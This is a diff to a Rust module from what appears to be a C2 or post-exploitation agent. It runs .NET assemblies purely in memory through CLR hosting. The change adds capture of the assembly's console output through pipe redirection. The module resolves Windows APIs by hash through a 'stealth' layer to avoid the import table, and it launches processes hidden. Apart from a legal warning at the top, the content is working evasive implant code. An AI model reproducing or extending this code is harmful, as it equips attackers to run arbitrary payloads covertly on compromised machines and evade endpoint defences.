@@ -4,7 +4,7 @@
 //
 // ⚠️ WARNING: This module implements in-memory .NET assembly execution techniques
 // commonly used in advanced C2 frameworks and post-exploitation tools.
-// 
+//
 // LEGAL NOTICE:
 // - Only use for legitimate security research, authorized penetration testing,
 //   or educational purposes with proper authorization.
@@ -26,8 +26,8 @@ use std::ptr;
 
 #[cfg(target_os = "windows")]
 use winapi::{
-    shared::winerror::FAILED,
     shared::guiddef::GUID,
+    shared::winerror::FAILED,
     um::unknwnbase::{IUnknown, IUnknownVtbl},
 };
 
@@ -230,6 +230,224 @@ interface ICorRuntimeHost(ICorRuntimeHostVtbl): IUnknown(IUnknownVtbl) {
     ) -> i32,
 }}
 
+// ─── Stdout/stderr capture for managed Console.Write* ────────────────────────
+
+#[cfg(target_os = "windows")]
+use winapi::ctypes::c_void;
+
+/// Redirect STD_OUTPUT_HANDLE / STD_ERROR_HANDLE to anonymous pipes around Invoke.
+#[cfg(target_os = "windows")]
+struct StdCapture {
+    old_out: *mut c_void,
+    old_err: *mut c_void,
+    read_out: *mut c_void,
+    write_out: *mut c_void,
+    read_err: *mut c_void,
+    write_err: *mut c_void,
+    set_std: Option<unsafe extern "system" fn(u32, *mut c_void) -> i32>,
+    close: Option<unsafe extern "system" fn(*mut c_void) -> i32>,
+    read_file:
+        Option<unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut c_void) -> i32>,
+    active: bool,
+}
+
+#[cfg(target_os = "windows")]
+impl StdCapture {
+    const STD_OUTPUT_HANDLE: u32 = 0xFFFFFFF5; // (DWORD)-11
+    const STD_ERROR_HANDLE: u32 = 0xFFFFFFF4; // (DWORD)-12
+
+    fn install() -> Self {
+        unsafe {
+            let mut cap = Self {
+                old_out: ptr::null_mut(),
+                old_err: ptr::null_mut(),
+                read_out: ptr::null_mut(),
+                write_out: ptr::null_mut(),
+                read_err: ptr::null_mut(),
+                write_err: ptr::null_mut(),
+                set_std: None,
+                close: None,
+                read_file: None,
+                active: false,
+            };
+            let k32 =
+                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
+            if k32 == 0 {
+                return cap;
+            }
+            let g = |n: &[u8]| crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(n));
+            let create_pipe: unsafe extern "system" fn(
+                *mut *mut c_void,
+                *mut *mut c_void,
+                *mut c_void,
+                u32,
+            ) -> i32 = match g(b"CreatePipe") {
+                Some(a) => std::mem::transmute(a),
+                None => return cap,
+            };
+            let get_std: unsafe extern "system" fn(u32) -> *mut c_void = match g(b"GetStdHandle") {
+                Some(a) => std::mem::transmute(a),
+                None => return cap,
+            };
+            let set_std: unsafe extern "system" fn(u32, *mut c_void) -> i32 =
+                match g(b"SetStdHandle") {
+                    Some(a) => std::mem::transmute(a),
+                    None => return cap,
+                };
+            let close: unsafe extern "system" fn(*mut c_void) -> i32 = match g(b"CloseHandle") {
+                Some(a) => std::mem::transmute(a),
+                None => return cap,
+            };
+            let read_file: unsafe extern "system" fn(
+                *mut c_void,
+                *mut u8,
+                u32,
+                *mut u32,
+                *mut c_void,
+            ) -> i32 = match g(b"ReadFile") {
+                Some(a) => std::mem::transmute(a),
+                None => return cap,
+            };
+
+            cap.old_out = get_std(Self::STD_OUTPUT_HANDLE);
+            cap.old_err = get_std(Self::STD_ERROR_HANDLE);
+
+            let mut r_out: *mut c_void = ptr::null_mut();
+            let mut w_out: *mut c_void = ptr::null_mut();
+            let mut r_err: *mut c_void = ptr::null_mut();
+            let mut w_err: *mut c_void = ptr::null_mut();
+            if create_pipe(&mut r_out, &mut w_out, ptr::null_mut(), 0) == 0 {
+                return cap;
+            }
+            if create_pipe(&mut r_err, &mut w_err, ptr::null_mut(), 0) == 0 {
+                close(r_out);
+                close(w_out);
+                return cap;
+            }
+            // Point both stdout and stderr at the same write end for simplicity? Separate is better.
+            if set_std(Self::STD_OUTPUT_HANDLE, w_out) == 0
+                || set_std(Self::STD_ERROR_HANDLE, w_err) == 0
+            {
+                close(r_out);
+                close(w_out);
+                close(r_err);
+                close(w_err);
+                let _ = set_std(Self::STD_OUTPUT_HANDLE, cap.old_out);
+                let _ = set_std(Self::STD_ERROR_HANDLE, cap.old_err);
+                return cap;
+            }
+            cap.read_out = r_out;
+            cap.write_out = w_out;
+            cap.read_err = r_err;
+            cap.write_err = w_err;
+            cap.set_std = Some(set_std);
+            cap.close = Some(close);
+            cap.read_file = Some(read_file);
+            cap.active = true;
+            cap
+        }
+    }
+
+    fn finish(mut self) -> String {
+        if !self.active {
+            return String::new();
+        }
+        unsafe {
+            // Restore original handles first so further writes don't block on full pipes
+            if let Some(set_std) = self.set_std {
+                let _ = set_std(Self::STD_OUTPUT_HANDLE, self.old_out);
+                let _ = set_std(Self::STD_ERROR_HANDLE, self.old_err);
+            }
+            // Close write ends so ReadFile sees EOF
+            if let Some(close) = self.close {
+                if !self.write_out.is_null() {
+                    let _ = close(self.write_out);
+                    self.write_out = ptr::null_mut();
+                }
+                if !self.write_err.is_null() {
+                    let _ = close(self.write_err);
+                    self.write_err = ptr::null_mut();
+                }
+            }
+            let mut out = Self::drain(self.read_file, self.read_out);
+            let err = Self::drain(self.read_file, self.read_err);
+            if let Some(close) = self.close {
+                if !self.read_out.is_null() {
+                    let _ = close(self.read_out);
+                }
+                if !self.read_err.is_null() {
+                    let _ = close(self.read_err);
+                }
+            }
+            self.active = false;
+            if !err.is_empty() {
+                if !out.is_empty() {
+                    out.push('\n');
+                }
+                out.push_str(&err);
+            }
+            out
+        }
+    }
+
+    unsafe fn drain(
+        read_file: Option<
+            unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut c_void) -> i32,
+        >,
+        handle: *mut c_void,
+    ) -> String {
+        let Some(read_file) = read_file else {
+            return String::new();
+        };
+        if handle.is_null() {
+            return String::new();
+        }
+        let mut buf = Vec::new();
+        let mut chunk = [0u8; 4096];
+        loop {
+            let mut n = 0u32;
+            let ok = read_file(
+                handle,
+                chunk.as_mut_ptr(),
+                chunk.len() as u32,
+                &mut n,
+                ptr::null_mut(),
+            );
+            if ok == 0 || n == 0 {
+                break;
+            }
+            buf.extend_from_slice(&chunk[..n as usize]);
+            if buf.len() > 8 * 1024 * 1024 {
+                break; // sanity cap
+            }
+        }
+        String::from_utf8_lossy(&buf).into_owned()
+    }
+}
+
+#[cfg(target_os = "windows")]
+impl Drop for StdCapture {
+    fn drop(&mut self) {
+        if !self.active {
+            return;
+        }
+        unsafe {
+            if let Some(set_std) = self.set_std {
+                let _ = set_std(Self::STD_OUTPUT_HANDLE, self.old_out);
+                let _ = set_std(Self::STD_ERROR_HANDLE, self.old_err);
+            }
+            if let Some(close) = self.close {
+                for h in [self.write_out, self.write_err, self.read_out, self.read_err] {
+                    if !h.is_null() {
+                        let _ = close(h);
+                    }
+                }
+            }
+            self.active = false;
+        }
+    }
+}
+
 // ─── Pure in-memory load helpers (IDispatch + SAFEARRAY, no temp files) ──────
 
 #[cfg(target_os = "windows")]
@@ -334,9 +552,6 @@ impl Variant {
 }
 
 #[cfg(target_os = "windows")]
-use winapi::ctypes::c_void;
-
-#[cfg(target_os = "windows")]
 #[repr(C)]
 struct DispParams {
     rgvarg: *mut Variant,
@@ -405,7 +620,8 @@ struct OleAut {
 unsafe fn resolve_oleaut() -> Option<OleAut> {
     let base = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"oleaut32.dll"));
     let base = if base == 0 {
-        let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
+        let k32 =
+            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
         let load: unsafe extern "system" fn(*const i8) -> usize = std::mem::transmute(
             crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"LoadLibraryA"))?,
         );
@@ -435,12 +651,12 @@ unsafe fn qi_idispatch(unk: *mut IUnknown) -> Result<*mut IDispatch, String> {
         return Err("null IUnknown".into());
     }
     let mut disp: *mut IDispatch = ptr::null_mut();
-    let hr = (*unk).QueryInterface(
-        &IID_IDISPATCH,
-        &mut disp as *mut _ as *mut *mut c_void,
-    );
+    let hr = (*unk).QueryInterface(&IID_IDISPATCH, &mut disp as *mut _ as *mut *mut c_void);
     if hr < 0 || disp.is_null() {
-        return Err(format!("QueryInterface(IDispatch) failed: 0x{:08X}", hr as u32));
+        return Err(format!(
+            "QueryInterface(IDispatch) failed: 0x{:08X}",
+            hr as u32
+        ));
     }
     Ok(disp)
 }
@@ -497,7 +713,10 @@ unsafe fn idispatch_invoke(
         &mut arg_err,
     );
     if hr < 0 {
-        return Err(format!("IDispatch::Invoke 0x{:08X} (arg_err={})", hr as u32, arg_err));
+        return Err(format!(
+            "IDispatch::Invoke 0x{:08X} (arg_err={})",
+            hr as u32, arg_err
+        ));
     }
     Ok(result)
 }
@@ -569,22 +788,22 @@ pub struct DotNetExecutor;
 
 impl DotNetExecutor {
     /// Execute a .NET assembly from memory
-    /// 
+    ///
     /// ⚠️ SECURITY WARNING: This function implements in-memory .NET assembly execution,
     /// a technique commonly used by advanced malware and C2 frameworks for evasion.
-    /// 
+    ///
     /// # Parameters
-    /// 
+    ///
     /// * `assembly_bytes` - Raw .NET assembly (PE/EXE) bytes
     /// * `arguments` - Command line arguments to pass to Main method
     /// * `app_domain_name` - Optional custom AppDomain name for stealth
-    /// 
+    ///
     /// # Returns
-    /// 
+    ///
     /// CommandResult with execution output and status
-    /// 
+    ///
     /// # Implementation Details
-    /// 
+    ///
     /// 1. Initializes COM and hosts the .NET CLR
     /// 2. Creates a custom AppDomain for isolation
     /// 3. Loads assembly from byte array into memory
@@ -599,7 +818,7 @@ impl DotNetExecutor {
         app_domain_name: Option<&str>,
     ) -> CommandResult {
         log::debug!("assembly load (memory)");
-        
+
         if assembly_bytes.is_empty() {
             return CommandResult {
                 stdout: String::new(),
@@ -608,7 +827,7 @@ impl DotNetExecutor {
                 req_id: None,
             };
         }
-        
+
         // Validate PE/MZ header
         if assembly_bytes.len() < 2 || &assembly_bytes[0..2] != b"MZ" {
             return CommandResult {
@@ -618,13 +837,14 @@ impl DotNetExecutor {
                 req_id: None,
             };
         }
-        
+
         log::debug!(".NET assembly size: {} bytes", assembly_bytes.len());
         log::debug!("Arguments: {:?}", arguments);
-        
+
         // Step 1: Initialize COM
         let com_result = unsafe { dyn_co_initialize_ex(COINIT_APARTMENTTHREADED) };
-        if FAILED(com_result) && com_result != -2147417850i32 { // RPC_E_CHANGED_MODE is OK
+        if FAILED(com_result) && com_result != -2147417850i32 {
+            // RPC_E_CHANGED_MODE is OK
             log::error!("Failed to initialize COM: 0x{:08X}", com_result);
             return CommandResult {
                 stdout: String::new(),
@@ -633,22 +853,23 @@ impl DotNetExecutor {
                 req_id: None,
             };
         }
-        
+
         log::debug!("COM initialized successfully");
-        
+
         // Step 2: Create CLR Host
         let result = Self::create_clr_host_and_execute(
             assembly_bytes,
             arguments,
             app_domain_name.unwrap_or("DefaultDomain"),
-        ).await;
-        
+        )
+        .await;
+
         // Step 3: Cleanup COM
         unsafe { dyn_co_uninitialize() };
-        
+
         result
     }
-    
+
     /// Create CLR host and execute assembly **purely in memory** (no temp file).
     ///
     /// Flow: ICLRMetaHost → ICorRuntimeHost → AppDomain → Load_3(byte[]) → EntryPoint.Invoke
@@ -658,10 +879,10 @@ impl DotNetExecutor {
         arguments: Vec<String>,
         domain_name: &str,
     ) -> CommandResult {
-        use winapi::shared::winerror::S_OK;
-        use winapi::Interface;
-        use winapi::um::unknwnbase::IUnknown;
         use widestring::WideCString;
+        use winapi::shared::winerror::S_OK;
+        use winapi::um::unknwnbase::IUnknown;
+        use winapi::Interface;
 
         unsafe {
             let ole = match resolve_oleaut() {
@@ -677,16 +898,16 @@ impl DotNetExecutor {
             };
 
             // 1. Ensure mscoree.dll is loaded via PEB/hash (avoid IAT LoadLibraryA).
-            let mut mscoree = crate::stealth::get_module_base(
-                crate::stealth::hash_module_name(b"mscoree.dll"),
-            );
+            let mut mscoree =
+                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"mscoree.dll"));
             if mscoree == 0 {
-                let k32 = crate::stealth::get_module_base(
-                    crate::stealth::hash_module_name(b"kernel32.dll"),
-                );
-                if let Some(load_addr) =
-                    crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"LoadLibraryA"))
-                {
+                let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(
+                    b"kernel32.dll",
+                ));
+                if let Some(load_addr) = crate::stealth::get_api_addr(
+                    k32,
+                    crate::stealth::hash_api_name(b"LoadLibraryA"),
+                ) {
                     let load_library: unsafe extern "system" fn(*const i8) -> usize =
                         std::mem::transmute(load_addr);
                     mscoree = load_library(b"mscoree.dll\0".as_ptr() as *const i8);
@@ -860,14 +1081,14 @@ impl DotNetExecutor {
                 let load_id = idispatch_get_id(domain, "Load_3")
                     .or_else(|_| idispatch_get_id(domain, "Load"))?;
                 let mut load_args = [load_arg];
-                let asm_var = match idispatch_invoke(domain, load_id, DISPATCH_METHOD, &mut load_args)
-                {
-                    Ok(v) => v,
-                    Err(e) => {
-                        let _ = (ole.safe_array_destroy)(psa_bytes);
-                        return Err(e);
-                    }
-                };
+                let asm_var =
+                    match idispatch_invoke(domain, load_id, DISPATCH_METHOD, &mut load_args) {
+                        Ok(v) => v,
+                        Err(e) => {
+                            let _ = (ole.safe_array_destroy)(psa_bytes);
+                            return Err(e);
+                        }
+                    };
                 // Load_3 takes ownership of the SAFEARRAY content via COM marshal; destroy our ref.
                 let _ = (ole.safe_array_destroy)(psa_bytes);
 
@@ -879,8 +1100,7 @@ impl DotNetExecutor {
 
                 // Assembly.EntryPoint (property get)
                 let ep_id = idispatch_get_id(asm_disp, "EntryPoint")?;
-                let ep_var =
-                    idispatch_invoke(asm_disp, ep_id, DISPATCH_PROPERTYGET, &mut [])?;
+                let ep_var = idispatch_invoke(asm_disp, ep_id, DISPATCH_PROPERTYGET, &mut [])?;
                 let method_disp = ep_var.as_pdisp() as *mut IDispatch;
                 if method_disp.is_null() {
                     ((*(*asm_disp).lp_vtbl).release)(asm_disp);
@@ -926,8 +1146,12 @@ impl DotNetExecutor {
                 let invoke_id = idispatch_get_id(method_disp, "Invoke")
                     .or_else(|_| idispatch_get_id(method_disp, "Invoke_3"))?;
                 let mut invoke_args = [obj_arg, params_arg];
+
+                // Redirect process stdout/stderr to anonymous pipes so Console.Write* is captured
+                let capture = StdCapture::install();
                 let invoke_result =
                     idispatch_invoke(method_disp, invoke_id, DISPATCH_METHOD, &mut invoke_args);
+                let captured = capture.finish();
 
                 let _ = (ole.safe_array_destroy)(psa_params);
                 // str_arr_var ownership transferred into params array; destroy carefully
@@ -938,14 +1162,21 @@ impl DotNetExecutor {
 
                 match invoke_result {
                     Ok(mut v) => {
-                        let summary = format!(
-                            ".NET Assembly executed in-memory (no disk). VARIANT vt=0x{:X}",
-                            v.vt
-                        );
                         let _ = (ole.variant_clear)(&mut v);
-                        Ok(summary)
+                        if captured.trim().is_empty() {
+                            Ok(String::new())
+                        } else {
+                            Ok(captured)
+                        }
                     }
-                    Err(e) => Err(e),
+                    Err(e) => {
+                        if !captured.trim().is_empty() {
+                            // Still return partial console output with the error
+                            Err(format!("{e}\n--- console ---\n{captured}"))
+                        } else {
+                            Err(e)
+                        }
+                    }
                 }
             })();
 
@@ -972,39 +1203,45 @@ impl DotNetExecutor {
             }
         }
     }
-    
+
     /// Execute .NET assembly using dotnet runtime
     #[cfg(target_os = "windows")]
     async fn execute_dotnet_assembly(path: &str, arguments: &[String]) -> CommandResult {
         log::info!("🚀 Executing .NET assembly: {}", path);
-        
+
         // Try different .NET execution methods
         let mut result = Self::try_dotnet_execution(path, arguments).await;
-        
+
         // If dotnet execution fails entirely OR returns a non-zero exit code (e.g., missing runtime config),
         // fallback to direct execution (.NET Framework).
         if let Ok(ref output) = result {
             if !output.status.success() {
-                debug!("dotnet execution failed with exit code {:?}, falling back to direct execution", output.status.code());
+                debug!(
+                    "dotnet execution failed with exit code {:?}, falling back to direct execution",
+                    output.status.code()
+                );
                 let fallback = Self::try_framework_execution(path, arguments).await;
                 if fallback.is_ok() {
                     result = fallback;
                 }
             }
         } else {
-             result = Self::try_framework_execution(path, arguments).await;
+            result = Self::try_framework_execution(path, arguments).await;
         }
-        
+
         match result {
             Ok(output) => {
                 let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                 let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                 let exit_code = output.status.code().unwrap_or(-1);
-                
-                info!("✅ .NET assembly execution completed with exit code: {}", exit_code);
+
+                info!(
+                    "✅ .NET assembly execution completed with exit code: {}",
+                    exit_code
+                );
                 debug!("Stdout length: {} bytes", stdout.len());
                 debug!("Stderr length: {} bytes", stderr.len());
-                
+
                 CommandResult {
                     stdout: format!(
                         ".NET Assembly execution successful!\nExit code: {}\n--- STDOUT ---\n{}\n--- STDERR ---\n{}",
@@ -1026,7 +1263,7 @@ impl DotNetExecutor {
             }
         }
     }
-    
+
     /// Try executing with dotnet runtime
     #[cfg(target_os = "windows")]
     async fn try_dotnet_execution(
@@ -1036,15 +1273,15 @@ impl DotNetExecutor {
         let mut cmd = tokio::process::Command::new("dotnet");
         cmd.arg(path);
         cmd.creation_flags(0x08000000 | 0x00000008); // CREATE_NO_WINDOW | DETACHED_PROCESS
-        
+
         for arg in arguments {
             cmd.arg(arg);
         }
-        
+
         debug!("Trying dotnet execution: dotnet {} {:?}", path, arguments);
         cmd.output().await
     }
-    
+
     /// Try executing with .NET Framework
     #[cfg(target_os = "windows")]
     async fn try_framework_execution(
@@ -1053,15 +1290,15 @@ impl DotNetExecutor {
     ) -> Result<std::process::Output, std::io::Error> {
         let mut cmd = tokio::process::Command::new(path);
         cmd.creation_flags(0x08000000 | 0x00000008); // CREATE_NO_WINDOW | DETACHED_PROCESS
-        
+
         for arg in arguments {
             cmd.arg(arg);
         }
-        
+
         debug!("Trying direct execution: {} {:?}", path, arguments);
         cmd.output().await
     }
-    
+
     /// Non-Windows implementation
     #[cfg(not(target_os = "windows"))]
     pub async fn execute_assembly(
@@ -1077,9 +1314,9 @@ impl DotNetExecutor {
             req_id: None,
         }
     }
-    
+
     /// Execute assembly with enhanced CLR hosting (advanced implementation)
-    /// 
+    ///
     /// This would be the full implementation using CLR hosting APIs
     /// Currently simplified for maintainability
     #[cfg(target_os = "windows")]
@@ -1090,15 +1327,15 @@ impl DotNetExecutor {
     ) -> CommandResult {
         info!("🔬 ADVANCED: .NET CLR hosting implementation");
         warn!("⚠️  This would use full CLR hosting APIs in production");
-        
+
         // This is where the full CLR hosting implementation would go:
         // 1. ICLRMetaHost::GetRuntime()
-        // 2. ICLRRuntimeInfo::GetInterface() 
+        // 2. ICLRRuntimeInfo::GetInterface()
         // 3. ICorRuntimeHost::CreateDomain()
         // 4. AppDomain::Load_3() with byte array
         // 5. Assembly::EntryPoint::Invoke()
         // 6. Capture stdout/stderr redirection
-        
+
         // For now, delegate to the simplified implementation
         Self::execute_assembly(assembly_bytes, arguments, app_domain_name).await
     }
@@ -1107,69 +1344,71 @@ impl DotNetExecutor {
 #[cfg(test)]
 mod tests {
     use super::*;
-    
+
     #[tokio::test]
     async fn test_execute_assembly_empty() {
         let result = DotNetExecutor::execute_assembly(vec![], vec![], None).await;
         assert!(!result.stderr.is_empty());
-        
+
         #[cfg(target_os = "windows")]
         assert!(result.stderr.contains("empty"));
-        
+
         #[cfg(not(target_os = "windows"))]
         assert!(result.stderr.contains("only supported on Windows"));
     }
-    
+
     #[tokio::test]
     async fn test_execute_assembly_invalid_pe() {
         let invalid_pe = vec![0x00, 0x01, 0x02, 0x03]; // Not PE/MZ header
         let result = DotNetExecutor::execute_assembly(invalid_pe, vec![], None).await;
-        
+
         #[cfg(target_os = "windows")]
         {
             assert!(!result.stderr.is_empty());
             assert!(result.stderr.contains("Invalid .NET assembly"));
         }
-        
+
         #[cfg(not(target_os = "windows"))]
         {
             assert!(result.stderr.contains("only supported on Windows"));
         }
     }
-    
+
     #[tokio::test]
     async fn test_execute_assembly_valid_pe_header() {
         // Create minimal PE header
         let mut pe_header = vec![0x4D, 0x5A]; // MZ header
         pe_header.extend_from_slice(&[0; 62]); // Minimal PE header size
-        
+
         let args = vec!["test".to_string(), "args".to_string()];
         let result = DotNetExecutor::execute_assembly(pe_header, args, Some("TestDomain")).await;
-        
+
         #[cfg(target_os = "windows")]
         {
             // Minimal MZ header is not a real assembly — execution must not "succeed" silently.
             // Accept any error text (COM/.NET host failures vary by host environment).
             assert!(
-                !result.stderr.is_empty() || result.stdout.contains("fail") || result.stdout.is_empty(),
+                !result.stderr.is_empty()
+                    || result.stdout.contains("fail")
+                    || result.stdout.is_empty(),
                 "unexpected result stdout={} stderr={}",
                 result.stdout,
                 result.stderr
             );
         }
-        
+
         #[cfg(not(target_os = "windows"))]
         {
             assert!(result.stderr.contains("only supported on Windows"));
         }
     }
-    
+
     #[test]
     fn test_pe_header_validation() {
         // Test PE header validation logic
         let valid_pe = vec![0x4D, 0x5A, 0x90, 0x00]; // MZ header
         assert_eq!(&valid_pe[0..2], b"MZ");
-        
+
         let invalid_pe = vec![0x7F, 0x45, 0x4C, 0x46]; // ELF header
         assert_ne!(&invalid_pe[0..2], b"MZ");
     }
